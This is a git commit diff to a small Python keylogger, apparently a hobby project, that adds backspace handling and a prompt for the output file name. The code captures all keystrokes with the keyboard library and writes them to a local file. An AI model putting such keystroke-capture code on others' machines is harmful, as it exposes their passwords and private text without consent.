c7df695ec6836cceb5266237546d18d7f7f899d8
sagi-angert <angert.sagi@gmail.com>
2025-02-20 19:51:45 +0200

    added backspace erasing a character

--- key_logger.py
+++ key_logger.py
@@ -2,14 +2,22 @@ import keyboard
 
 class KeyLogger():
     def __init__(self, filename):
-        self.log_file = open(filename, "w")
+        self.log_file = open(filename, "w+")
     
     def ReadKey(self, key):
         print_key = key.name
         match print_key:
-            case "space": print_key = " "
-            case "enter": print_key = "\n"
-            
+            case "space": 
+                print_key = " "
+            case "enter": 
+                print_key = "\n"
+            case "backspace":
+                self.log_file.seek(0)
+                data = self.log_file.read()
+                data = data[:-1]
+                self.log_file.seek(0)
+                self.log_file.truncate()
+                print_key = data
         self.log_file.write(print_key)
         self.log_file.flush()
 
@@ -18,7 +26,7 @@ class KeyLogger():
         keyboard.wait()
 
 def main():
-    key_log = KeyLogger("key_log_file.txt")
+    key_log = KeyLogger(input("enter name of output text: "))
     while True:
         key_log.StartLog()
 
